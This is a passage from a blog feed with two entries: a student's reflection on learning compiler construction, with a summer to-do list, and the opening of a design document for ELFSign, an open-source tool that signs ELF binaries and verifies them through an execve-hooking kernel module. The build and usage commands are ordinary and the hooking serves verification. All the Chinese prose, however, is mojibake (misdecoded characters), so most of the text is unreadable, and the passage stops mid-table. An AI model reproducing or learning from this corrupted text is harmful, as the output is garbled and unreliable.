&lt;p&gt;â€ƒâ€ƒç°åœ¨æ˜¯6æœˆ29,å‰å¤©æ”¶åˆ°äº†ä¸Šäº¤çš„offerï¼Œæš‘å‡è¦å»ä»–ä»¬çš„å®éªŒå®¤æ‰“å·¥äº†ï¼Œæˆ‘ä¸»è¦æ˜¯æƒ³æ¢ä¸€ä¸ªç¯å¢ƒï¼Œä¸çŸ¥é“ä¸ºå•¥åœ¨å®¶æ€»æ˜¯æ•ˆç‡å¾ˆä½ï¼Œå¿ƒé‡Œè¿˜æ˜¯å¾ˆæ„§ç–šçš„ã€‚æ¯”è¾ƒæ˜æ˜¾çš„æ„Ÿå—å°±æ˜¯ï¼Œæˆ‘åœ¨å­¦æ ¡çš„æ—¶å€™ï¼Œçœ‹ä¹¦æ•ˆç‡å¾ˆé«˜ï¼Œæˆ‘èƒ½çœ‹ä¸€å¤©éƒ½åœä¸ä¸‹æ¥ï¼Œç°åœ¨åœ¨å®¶è¯»ä¹¦20åˆ†é’Ÿå°±å¼€å§‹èµ°ç¥ï¼Œåº”è¯¥è¿˜æ˜¯ä¸€ä¸ªæ°›å›´é—®é¢˜ã€‚è¿™å¯¹æˆ‘æ¥è¯´æ˜¯ç›¸å½“è¦å‘½çš„ï¼Œå°¤å…¶æ˜¯åœ¨æˆ‘å­¦ç¼–è¯‘åŸç†çš„æ—¶å€™ï¼Œæˆ‘ä½ä¼°äº†è¿™éƒ¨åˆ†çŸ¥è¯†çš„éš¾åº¦å’Œå¹¿åº¦ï¼Œä¾ç„¶è¿½æ±‚å¿«é€Ÿçš„å­¦ä¹ ã€‚æ˜¾ç„¶æˆ‘å¤±è´¥äº†ï¼Œå°¤å…¶æ˜¯å‰é¢parserçš„éƒ¨åˆ†ï¼Œæˆ‘ä¸ªäººè®¤ä¸ºç”šè‡³åº”è¯¥å…ˆè·³è¿‡å»ï¼Œé‚£äº›æ— èŠçš„è‡ªåŠ¨æœºçŸ¥è¯†å’Œè¯­æ³•åˆ†æçš„ç®—æ³•çœŸçš„è®©æˆ‘æä¸èµ·å…´è¶£ï¼Œæˆ‘æ„Ÿè§‰MaxXingè¯´çš„å¾ˆå¯¹ï¼Œå‰ç«¯èƒ½å†™é€’å½’ä¸‹é™å°±è¡Œäº†ï¼ŒçœŸæ­£å¥½ç©çš„æ¯”å¦‚ä¼˜åŒ–ï¼Œç¨‹åºåˆ†æï¼Œä»£ç ç”Ÿæˆå•¥çš„éƒ½åœ¨åé¢ã€‚&lt;/p&gt;

&lt;p&gt;â€ƒâ€ƒå…³äºç¼–è¯‘åŸç†çš„å­¦ä¹ ï¼Œæˆ‘é‡åˆ°äº†å¾ˆå¤§çš„é˜»åŠ›ï¼Œæœ‰æ—¶å€™ä¸€æ®µä¼ªä»£ç æˆ‘è¦çœ‹å¥½ä¹…ï¼Œè€Œä¸”æœ‰äº›ä¸œè¥¿æˆ‘ä¸çŸ¥é“æ€ä¹ˆç”¨ä»£ç å†™ï¼Œæ¯”å¦‚åœ¨ä»£ç ä¼˜åŒ–çš„éƒ¨åˆ†ï¼Œå¯ä»¥æ ¹æ®åˆ†æ”¯çš„é¢‘ç‡æ¥è®¾ç½®â€œè½ç©ºåˆ†æ”¯â€çš„ä½ç½®ï¼Œå°±å¾ˆè¿·æƒ‘è¿™ä¸ªé¢‘ç‡æ˜¯å’‹ç»Ÿè®¡çš„ã€‚æ¯”å¦‚å¾ªç¯å±•å¼€ï¼Œçœ‹èµ·æ¥æŒºå®¹æ˜“çš„ï¼Œä½†æ˜¯æ€ä¹ˆå»åˆ¤æ–­å¾ªç¯è¾¹ç•Œã€‚è¿™ç§ç»†èŠ‚é—®é¢˜æˆ–è®¸æˆ‘ä¸å¿…çº ç»“ï¼Œä½†æ˜¯ä¸å†™ä»£ç æ€»æ„Ÿè§‰æ²¡å­¦ä¼šã€‚ä¸è¿‡å¹¸è¿çš„æ˜¯MaxXingç»™æˆ‘ä»¬è®²äº†ä¸€ä¸‹&lt;a href=&quot;https://github.com/MaxXSoft/YuLang&quot;&gt;YuLang&lt;/a&gt;çš„å…·ä½“å®ç°ï¼ŒYuLangåç«¯ç”¨çš„LLVM,æ‰€ä»¥MaxXingæ‰‹å†™äº†å‰ç«¯å’Œä¸­ç«¯ï¼Œå‰ç«¯æˆ‘åŸºæœ¬èƒ½ç‹—å‡ºæ¥ï¼Œä½†æ˜¯ä¸­ç«¯çš„IRæˆ‘è¿˜æ²¡æœ‰ä»”ç»†æƒ³æ€ä¹ˆå…·ä½“å®ç°ï¼Œæ¯”å¦‚åº”è¯¥ç”¨ä»€ä¹ˆç»“æ„å­˜å‚¨IRï¼ˆéœ€è¦å­˜å‚¨å—ï¼Ÿè¿˜æ˜¯ç›´æ¥ç”Ÿæˆï¼‰ï¼Œè¿™äº›ä¹¦ä¸Šæ²¡å…·ä½“è®²ï¼Œè¿˜æ˜¯å¾—å»çœ‹ä»£ç ï¼Œæˆ–è®¸é²¸ä¹¦é‡Œä¼šæœ‰è®²è§£ï¼ŸMaxXingç»™æˆ‘ä»¬è®²äº†ä¸€ä¸‹ç°ä»£ç¼–è¯‘å™¨çš„passéƒ¨åˆ†ï¼Œæˆ‘è§‰å¾—è¿™ç§è®¾è®¡çœŸçš„æŒºç¥å¥‡çš„ï¼Œè±ç„¶å¼€æœ—ã€‚ä¸­ç«¯çš„éƒ¨åˆ†ä¸»è¦ä»‹ç»äº†ä¸€äº›IRçš„ç§ç±»ï¼Œæ¯”å¦‚å›¾IRï¼Œçº¿æ€§IRï¼ŒSSAè¿™ç§ã€‚æ¯”è¾ƒæœ‰æ„æ€çš„æ˜¯ç”±IRå»ºç«‹cfgçš„éƒ¨åˆ†ï¼Œæˆ‘æ°å·§åœ¨ææ¨¾è€å¸ˆçš„ã€Šè½¯ä»¶åˆ†æã€‹é‡Œå­¦è¿‡äº†ï¼Œæˆ‘è¦æ˜¯ç›´æ¥è¯»ä¼ªä»£ç è‚¯å®šçœ‹ä¸æ‡‚ï¼Œç„¶ååœ¨ç¬¬8ç« è®²å˜é‡å¯è¾¾æ€§åˆ†æçš„ç®—æ³•æˆ‘åˆæ—¶åœ¨ææ¨¾è€å¸ˆé‚£é‡Œå­¦çš„å“ˆå“ˆå“ˆã€‚è¿™æœ¬ä¹¦ä¸­ç«¯éƒ¨åˆ†å äº†å¾ˆå¤§æ¯”é‡ï¼Œä¼˜åŒ–ç®—æ³•åŸºæœ¬éƒ½æ˜¯ä¼ªä»£ç ï¼Œæˆ‘çœ‹ç€æœ‰äº›è´¹åŠ²ï¼Œä½†æ˜¯ç¨‹åºåˆ†æçš„å†…å®¹è®²çš„å€’æ˜¯æŒºå¤šçš„ï¼Œæˆ‘æ¥ä¸‹æ¥è¦é¢ä¸´çš„æŒ‘æˆ˜å°±æ˜¯å®ç°mem2regï¼ŒæŠŠç°æœ‰çš„IRå¼„æˆçœŸæ­£çš„SSAï¼Œç„¶åæ‰èƒ½è¿›ä¸€æ­¥åšä¼˜åŒ–ã€‚æˆ‘ä¸Šé¢çš„ä¸€äº›å›°æƒ‘æˆ–è®¸ä¸ä¹…ä¹‹åå°±ä¼šè§£ç­”ï¼Œå›å¤´æ¥çœ‹æˆ–è®¸ä¼šè§‰å¾—å¯ç¬‘ï¼Œå› ä¸ºæˆ‘å­¦å¾—è¿˜å¤ªå°‘ï¼Œä¼°è®¡æŠŠåé¢å‡ ç« è¯»å®Œèƒ½æœ‰ä¸ªæ›´å¥½çš„ç†è§£ï¼Œå¸Œæœ›èƒ½å­¦åˆ°å¿ƒé‡Œå»å§ã€‚çœŸå¿ƒæ„Ÿè°¢MaxXingå­¦é•¿ï¼Œæ”¹å˜äº†æˆ‘çš„å¤§å­¦ç”Ÿæ´»è½¨è¿¹ã€‚&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;æˆ‘å»å’¨è¯¢äº†ä¸€ä¸‹å¤§æˆ‘ä¸€å±Šçš„å­¦é•¿ï¼Œå‘ç°æˆ‘æ ¡çš„ç¼–è¯‘åŸç†åªå°†parseréƒ¨åˆ†â€¦å¥½å§ï¼Œæˆ‘å·²ç»ä¸æ‰“ç®—å¬è¯¾äº†ã€‚&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;â€ƒâ€ƒä¹‹å‰å­¦ä¹ çš„æ—¶å€™ä¸ºäº†è´ªå›¾çŸ¥è¯†é‡ï¼Œå›«å›µåæ£èˆ¬çš„è¯»äº†å¾ˆå¤šä¹¦ï¼Œæ„Ÿè§‰å¾ˆå¤šä¸œè¥¿éƒ½æ˜¯ä¼¼æ‡‚éæ‡‚çš„ã€‚å¸Œæœ›æ¥ä¸‹æ¥çœ‹ä¹¦è¦ç»†ç»†çš„å»çœ‹ï¼Œçœ‹ä¸€ä¼šå„¿æ€è€ƒä¸€ä¼šå„¿ï¼Œå¤šå»æƒ³æƒ³å„ä¸ªçŸ¥è¯†ç‚¹ä¹‹é—´çš„è”ç³»ï¼Œå¯èƒ½ä¼šæ‰å®ä¸€ç‚¹ï¼Œæ¯”å¦‚æŠŠç¼–è¯‘åŸç†å’Œä½“ç³»ç»“æ„è”ç³»èµ·æ¥ï¼Œåˆä¼šæœ‰æ–°çš„æ€è€ƒ;æ¯”å¦‚å…¶å®åæ±‡ç¼–å™¨çš„åŸç†å’Œcpuæ˜¯ä¸€æ ·çš„ã€‚&lt;/p&gt;

&lt;p&gt;â€ƒâ€ƒå¦‚æœæ‚¨è¯»åˆ°äº†è¿™é‡Œï¼Œä¸çŸ¥é“æ‚¨æ˜¯å¦å’Œæˆ‘ä¸€æ ·ï¼ŒçŠ¯äº†åŒæ ·çš„é”™è¯¯ï¼Ÿå­¦ä¹ ï¼Œåˆ‡å‹¿è´ªå¿«å‘€ï¼Œç»ƒå¾—æ‰å®çš„åŸºç¡€æ‰æ˜¯ç‹é“ã€‚&lt;/p&gt;

&lt;p&gt;æš‘æœŸ TODO Listï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;é”»ç‚¼ï¼Œæœ€å¥½èƒ½è·‘æ­¥&lt;/li&gt;
  &lt;li&gt;çœ‹ä¹¦ï¼Œå®æ„¿é€Ÿåº¦æ…¢ä¸€ç‚¹ï¼Œä¹Ÿè¦è®¤çœŸå¼„æ‡‚&lt;/li&gt;
  &lt;li&gt;æ•´è‹±è¯­ï¼Œæˆ‘è¢«è‡ªå·±çš„æ‹–å»¶ç—‡æ•´æœäº†ã€‚ã€‚ã€‚&lt;/li&gt;
  &lt;li&gt;æ“ä½œç³»ç»Ÿï¼Œå¸Œæœ›è‡ªå·±èƒ½è¶æš‘å‡å­¦ä¸€ä¸‹ï¼Œæˆ‘ä¼°è®¡æ²¡æ—¶é—´äº†ï¼Œå› ä¸ºå¯èƒ½è¦çœ‹ç¼–è¯‘åŸç†&lt;/li&gt;
  &lt;li&gt;åˆ‡å‰²æ—¶é—´ï¼ŒæŒ‰è®¡åˆ’è¡Œäº‹ï¼Œå¾€å¾€èƒ½ä¿æŠ¤æˆ‘çš„å¨±ä¹æ—¶é—´ï¼Œæ‹’ç»æ‹–å»¶&lt;/li&gt;
&lt;/ol&gt;</content><author><name>dyf</name><email>dyf.auroa@gmail.com</email></author><category term="solo" /><summary type="html">â€ƒâ€ƒå¤§äºŒä¸‹ç¨€é‡Œç³Šæ¶‚å°±åœ¨å®¶æ··è¿‡å»äº†ï¼Œæ€»æ„Ÿè§‰å•¥ä¹Ÿæ²¡å¹²ï¼Œå¿ƒé‡Œæœ‰äº›è¿‡æ„ä¸å»ã€‚æ€»çš„æ¥è¯´æŠ€æœ¯æ–¹é¢çš„è¿›æ­¥é€Ÿåº¦ååˆ†ä¹‹ç¼“æ…¢ï¼Œåº”è¯¥æ˜¯åœ¨å®¶é‡Œæ¯”è¾ƒæ€ å •ï¼Œä¸»è¦å¹²äº†ä¸€ä¸‹äº‹æƒ…ï¼š</summary></entry><entry><title type="html">ELFSign è®¾è®¡æ–‡æ¡£</title><link href="http://localhost:4000/blog/ELFSign" rel="alternate" type="text/html" title="ELFSign è®¾è®¡æ–‡æ¡£" /><published>2020-05-10T00:00:00+08:00</published><updated>2020-05-10T00:00:00+08:00</updated><id>http://localhost:4000/blog/ELFSign</id><content type="html" xml:base="http://localhost:4000/blog/ELFSign">&lt;h2 id=&quot;0x01-é¡¹ç›®ç®€ä»‹&quot;&gt;0x01 é¡¹ç›®ç®€ä»‹&lt;/h2&gt;

&lt;p&gt;â€ƒâ€ƒæœ¬é¡¹ç›®åä¸º&lt;a href=&quot;https://github.com/Explainaur/ELFSign&quot;&gt;ELFSign&lt;/a&gt;ï¼Œå·²åœ¨Githubå¼€æºã€‚å¯å¯¹ä»»æ„ELF 32/64 ä½æ–‡ä»¶è¿›è¡Œç­¾åå¹¶éªŒè¯ã€‚ç­¾ååå¯é€šè¿‡&lt;code class=&quot;highlighter-rouge&quot;&gt;readelf&lt;/code&gt;ä¸&lt;code class=&quot;highlighter-rouge&quot;&gt;objdump&lt;/code&gt;ç­‰å·¥å…·çš„æ£€æµ‹ï¼Œä¸”ä¸å½±å“æ­£å¸¸è¿è¡Œã€‚ä¸æœ¬é¡¹ç›®é…å¥—çš„å¦ä¸€å·¥ç¨‹ä¸º&lt;a href=&quot;https://github.com/Explainaur/Kui&quot;&gt;Kui&lt;/a&gt;,è¯¥é¡¹ç›®ä¸ºLinux Kernel Moduleï¼Œä»¥Hookç³»ç»Ÿè°ƒç”¨&lt;code class=&quot;highlighter-rouge&quot;&gt;execve&lt;/code&gt;çš„æ–¹å¼ï¼Œåœ¨ELFæ‰§è¡Œå‰å¯¹å…¶è¿›è¡Œç­¾åæ ¡éªŒï¼Œè¯¦ç»†è¯·è§ç›¸å…³æ–‡æ¡£ï¼Œè¯¥é¡¹ç›®ä¹Ÿå·²åœ¨Githubå¼€æºï¼Œæ¬¢è¿starã€‚&lt;/p&gt;

&lt;h2 id=&quot;0x02-åŠŸèƒ½ä»‹ç»&quot;&gt;0x02 åŠŸèƒ½ä»‹ç»&lt;/h2&gt;

&lt;p&gt;ELFSignçš„åŸºæœ¬åŠŸèƒ½æœ‰ä»¥ä¸‹3ä¸ªï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ç”Ÿæˆå…¬ç§é’¥å¯¹æˆ–X509è¯ä¹¦&lt;/li&gt;
  &lt;li&gt;å¯¹ELFæ–‡ä»¶è¿›è¡Œç­¾åï¼Œå¹¶åœ¨ELFæ–‡ä»¶ä¸­æ–°å»ºä¸€ä¸ª&lt;code class=&quot;highlighter-rouge&quot;&gt;.sign&lt;/code&gt; section,ç„¶åå°†ç­¾åå‚¨å­˜åˆ°è¯¥sectionä¸­&lt;/li&gt;
  &lt;li&gt;å¯¹ç­¾ååçš„æ–‡ä»¶è¿›è¡Œæ ¡éªŒï¼Œè‹¥æ ¡éªŒé€šè¿‡åˆ™å¯æ‰§è¡Œ&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;å®‰è£…æ–¹å¼&quot;&gt;å®‰è£…æ–¹å¼&lt;/h3&gt;

&lt;p&gt;â€ƒâ€ƒè¯¥é¡¹ç›®ä¾èµ–&lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt;ï¼Œdebianç±»ç³»ç»Ÿä½¿ç”¨è®°å¾—å®‰è£…&lt;code class=&quot;highlighter-rouge&quot;&gt;libssl&lt;/code&gt;ç›¸å…³çš„å¼€å‘åº“è¿›è¡Œç¼–è¯‘ã€‚&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/Explainaur/ELFSign
&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;build
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;build
cmake ..
make &lt;span class=&quot;nt&quot;&gt;-j8&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å…·ä½“çš„çš„Usageå¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;USAGE: ./ELFSign &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;options] file...
Options:
        &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--check&lt;/span&gt; Check ELF file and execute it
        &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--check-X509&lt;/span&gt; Check ELF file with X509 and execute it
        &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--sign&lt;/span&gt; Sign a ELF file
        &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--argument&lt;/span&gt; Set arguments of ELF file to execute
        &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--generate&lt;/span&gt; Generate public and private key pair
        &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--create-X509&lt;/span&gt; Generate X509 certificate
        &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--path&lt;/span&gt; Set the path of public/private key
        &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--elf&lt;/span&gt; Set the path of ELF file

Example:
         ./ELFSign &lt;span class=&quot;nt&quot;&gt;--sign&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; ./prikey.pem &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; hello.out
         ./ELFSign &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; ./pubkey.pem &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; hello.out
         ./ELFSign &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; ./ELFSign.pem &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; /usr/bin/cat &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; a.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;0x03-è®¾è®¡åŸç†&quot;&gt;0x03 è®¾è®¡åŸç†&lt;/h2&gt;

&lt;p&gt;è¯¥é¡¹ç›®å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸€ä¸‹å‡ ä¸ªæ¨¡å—ï¼Œæˆ‘ä¼šä¸€ä¸€è¯¦ç»†ä»‹ç»å„ä¸ªmoduleçš„åŸç†ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ELFæ–‡ä»¶è§£ææ¨¡å—&lt;/li&gt;
  &lt;li&gt;ELFæ–‡ä»¶çš„è¯»å†™Sectionæ¨¡å—&lt;/li&gt;
  &lt;li&gt;RSAç›¸å…³çš„ç­¾åç®—æ³•æ¨¡å—&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;elfæ–‡ä»¶è§£ææ¨¡å—&quot;&gt;ELFæ–‡ä»¶è§£ææ¨¡å—&lt;/h3&gt;
&lt;p&gt;â€ƒâ€ƒè¯¥æ¨¡å—ä¸»è¦åŠŸèƒ½ä¸ºï¼šä»æŒ‡å®šçš„ELFæ–‡ä»¶ä¸­åŠ è½½&lt;strong&gt;æ‰€æœ‰çš„Load Segment&lt;/strong&gt;.äº‹å®ä¸Šæ‰€æœ‰å¯¹ELFè¯»å†™ç›¸å…³çš„æ ¸å¿ƒæ“ä½œå‡ ä¹éƒ½åœ¨å¯¹ELF Headerä¸Program Header Tableä»¥åŠSection Header Tableçš„è§£æä¸Šï¼Œæˆ‘ä»¬é¦–å…ˆæ¥ç®€å•ä»‹ç»ä¸€ä¸‹ELFæ–‡ä»¶çš„æ ¼å¼ã€‚&lt;/p&gt;

&lt;p&gt;ELFæ–‡ä»¶çš„å®è§‚ç»“æ„å¤§æ¦‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://pic.dyf.ink/object_file_format.png&quot; alt=&quot;object_file_format.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;â€ƒâ€ƒELFæ–‡ä»¶æœ‰ä¸¤ç§è§†å›¾ï¼Œä¸€ç§æ˜¯é“¾æ¥ç‰ˆï¼Œä¸€ç§æ˜¯æ‰§è¡Œç‰ˆã€‚é“¾æ¥ç‰ˆä¸»è¦ç”±sectionæ„æˆï¼Œè¿è¡Œç‰ˆåˆ™ä¸»è¦æœ‰segmentæ„æˆã€‚é‚£ä¹ˆsectionå’Œsegmentçš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ å®é™…ä¸Šsegmentç”±sectionæ„æˆï¼Œåœ¨æ˜ å°„åˆ°è™šæ‹Ÿå†…å­˜ä¸­åï¼Œå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„data segmentï¼Œcode segmentä¹‹ç±»çš„ã€‚æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä¸»è¦å…³å¿ƒsectionç›¸å…³çš„ç»“æ„ã€‚&lt;/p&gt;

&lt;p&gt;â€ƒâ€ƒé¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒELFæ–‡ä»¶ç”±ELF Headerï¼ŒProgram Header Tableï¼Œsectionï¼ŒSection Header Tableæ„æˆã€‚å½“ç„¶é“¾æ¥è§†å›¾ä¸­ï¼Œprogram header tableæ˜¯å¯é€‰çš„ï¼Œå› ä¸ºä»–ä¸»è¦ç”¨äºå‘Šè¯‰ç³»ç»Ÿå¦‚ä½•åˆ›å»ºè¿›ç¨‹ã€‚ç”¨äºç”Ÿæˆè¿›ç¨‹çš„ç›®æ ‡æ–‡ä»¶å¿…é¡»å…·æœ‰ç¨‹åºå¤´éƒ¨è¡¨ï¼Œä½†æ˜¯é‡å®šä½æ–‡ä»¶ä¸éœ€è¦è¿™ä¸ªè¡¨ã€‚ä¸‹é¢ç»™ä¸€ä¸ªæ¯”è¾ƒå½¢è±¡çš„å›¾ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://pic.dyf.ink/elf-layout.png&quot; alt=&quot;elf-layout.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;â€ƒâ€ƒå¯ä»¥çœ‹åˆ°Program Header Tableä¸»è¦å’Œsegmentæœ‰å…³ï¼Œsection header tableåˆ™å­˜å‚¨äº†æ¯ä¸ªsectionç›¸å…³çš„è¡¨é¡¹ã€‚è€ŒELF headeråˆ™å­˜å‚¨äº†ELFçš„ç›¸å…³ä¿¡æ¯ï¼Œæ¯”å¦‚ä»£ç æ®µå…¥å£ï¼Œsectionçš„æ•°ç›®ï¼Œsection headerçš„offsetä¹‹ç±»çš„ã€‚&lt;/p&gt;

&lt;p&gt;â€ƒâ€ƒé‚£ä¹ˆç¬¬ä¸€æ­¥ï¼Œæˆ‘ä»¬éœ€è¦è¯»å–æ‰€æœ‰çš„Load Segmentï¼Œä¸Šé¢æˆ‘ä»¬å·²ç»åˆ†æäº†ï¼Œä¸segmentæœ‰å…³çš„ä¿¡æ¯éƒ½åœ¨Program Header Tableè¿™ä¸ªstructæ•°ç»„é‡Œï¼Œå› æ­¤æˆ‘ä»¬é¦–å…ˆåº”è¯¥å»è§£æ&lt;code class=&quot;highlighter-rouge&quot;&gt;Elf32_Phdr&lt;/code&gt;è¿™ä¸ªç»“æ„ä½“ï¼š&lt;/p&gt;

&lt;p&gt;â€ƒâ€ƒ&lt;strong&gt;Program Header Table&lt;/strong&gt; æ˜¯ä¸€ä¸ªç»“æ„ä½“æ•°ç»„ï¼Œæ¯ä¸€ä¸ªå…ƒç´ çš„ç±»å‹æ˜¯ &lt;code class=&quot;highlighter-rouge&quot;&gt;Elf32_Phdr&lt;/code&gt;ï¼Œæè¿°äº†ä¸€ä¸ªæ®µæˆ–è€…å…¶å®ƒç³»ç»Ÿåœ¨å‡†å¤‡ç¨‹åºæ‰§è¡Œæ—¶æ‰€éœ€è¦çš„ä¿¡æ¯ã€‚å…¶ä¸­ï¼ŒELF å¤´ä¸­çš„ &lt;code class=&quot;highlighter-rouge&quot;&gt;e_phentsize&lt;/code&gt; å’Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;e_phnum&lt;/code&gt; æŒ‡å®šäº†è¯¥æ•°ç»„æ¯ä¸ªå…ƒç´ çš„å¤§å°ä»¥åŠå…ƒç´ ä¸ªæ•°ã€‚ä¸€ä¸ªç›®æ ‡æ–‡ä»¶çš„æ®µåŒ…å«ä¸€ä¸ªæˆ–è€…å¤šä¸ªèŠ‚ã€‚ç¨‹åºçš„å¤´éƒ¨åªæœ‰å¯¹äºå¯æ‰§è¡Œæ–‡ä»¶å’Œå…±äº«ç›®æ ‡æ–‡ä»¶æœ‰æ„ä¹‰ã€‚&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;Elf32_Word&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;p_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;			&lt;span class=&quot;cm&quot;&gt;/* Segment type */&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;Elf32_Off&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;p_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Segment file offset */&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;Elf32_Addr&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;p_vaddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Segment virtual address */&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;Elf32_Addr&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;p_paddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Segment physical address */&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;Elf32_Word&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;p_filesz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Segment size in file */&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;Elf32_Word&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;p_memsz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Segment size in memory */&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;Elf32_Word&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;p_flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Segment flags */&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;Elf32_Word&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;p_align&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Segment alignment */&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Elf32_Phdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æ¯ä¸ªå­—æ®µçš„è¯´æ˜å¦‚ä¸‹:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;å­—æ®µ&lt;/th&gt;
      &lt;th&gt;è¯´æ˜&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;p_type&lt;/td&gt;
      &lt;td&gt;è¯¥å­—æ®µä¸ºæ®µçš„ç±»å‹ï¼Œæˆ–è€…è¡¨æ˜äº†è¯¥ç»“æ„çš„ç›¸å…³ä¿¡æ¯ã€‚&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;p_offset&lt;/td&gt;
      &lt;td&gt;è¯¥å­—æ®µç»™å‡ºäº†ä»æ–‡ä»¶å¼€å§‹åˆ°è¯¥æ®µå¼€å¤´çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åç§»ã€‚&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;p_vaddr&lt;/td&gt;
      &lt;td&gt;è¯¥å­—æ®µç»™å‡ºäº†è¯¥æ®µç¬¬ä¸€ä¸ªå­—èŠ‚åœ¨å†…å­˜ä¸­çš„è™šæ‹Ÿåœ°å€ã€‚&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
